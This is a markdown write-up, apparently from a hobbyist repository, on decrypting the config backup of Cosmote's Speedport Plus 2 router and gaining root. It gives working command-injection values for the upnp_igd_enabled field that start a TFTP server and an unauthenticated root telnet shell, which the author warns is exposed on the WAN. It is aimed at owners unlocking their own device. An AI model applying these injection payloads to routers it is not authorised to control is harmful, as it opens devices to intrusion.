# Speedport Plus 2
This is a very popular router provided by Cosmote Telekom in Greece, Croatia and other countries. There are two variants of this router, a Sercomm one and an Arcadyan one. The codename of the Sercomm model is VD4224BDT. It's the only black Speedport.

## Firmware Analysis
Both variants have OTA images that are not encrypted. You can get them from the [Gr_ISP_Router_Firmware](https://github.com/k-marios/Gr_ISP_Router_Firmware/tree/main/Cosmote) repo and extract them using `binalk -Me`

## The User Configuration File
The Arcadyan version reads a secret from NVRAM which I couldn't determine without a dump.
<br>The Sercomm version asks the user for a password and then outputs a file called `configurationBackup.cfg` that is internally referred to as `VD4224BDT_Config.cfg` and starts with `Salted__`
<br>We can decrypt it pretty easily using OpenSSL. I used `12345678` as the password for this example
```sh
openssl enc -d -aes256 -pass pass:12345678 -in configurationBackup.cfg -out VD4224BDT_Config.tgz
```
Once we decrypt it we can decompress it using `tar` like so
```
tar -xzf VD4224BDT_Config.tgz
```
Everything inside is plaintext, the file `psi_wifi` is compressed using `lzw`. The script `decompress_psi_wifi.py` can be utilized to decompress it.

## Getting Root Shell
First of all we must get a config file and decrypt/decompress it using the instructions above.
<br>Then we must edit the not so aptly named file `syscfg.db` as root using a text editor. Do not share this file anywhere, it contains your VOIP passwords in plaintext.
<br>Find the field `upnp_igd_enabled` and change it to `upnp_igd_enabled='; udpsvd -vE 0.0.0.0 69 tftpd -c /data; #`, save and close the file.
<br>Run `md5sum syscfg.db` to compute the MD5 checksum of the file we edited and paste it on `syscfg.md5`.
<br>Recompress the folder using `sudo tar -czf VD4224BDT_Config.tgz --owner=0 --group=0 --numeric-owner VD4224BDT_Config` and encrypt it using `openssl enc -aes256 -pass pass:12345678 -in VD4224BDT_Config.tgz -out configurationBackup.cfg`
<br>Restore the modified config, the router should reboot.
<br>After the router finishes booting, download the `busybox` binary from [here](https://busybox.net/downloads/binaries/1.21.1/busybox-armv7l) and using a TFTP client like `tftp-hpa` push the binary using `tftp -m binary 192.168.1.1 -c put busybox busybox`
<br>Once the binary has uploaded successfully repeat the configuration steps two times, first restore a config with `upnp_igd_enabled='; chmod +x /data/busybox; #` to make the binary executable and then with `upnp_igd_enabled='; /data/busybox telnetd -l /bin/sh -p 2323; #` to make the telnet daemon run at boot.
<br>Once that is finished, you should be able to get root shell using `telnet 192.168.1.1 2323`.
<br>
<br>Warning: This bypasses the firewall so it's open on WAN too. It's recommended that you turn it off once you are finished if the router is public facing.
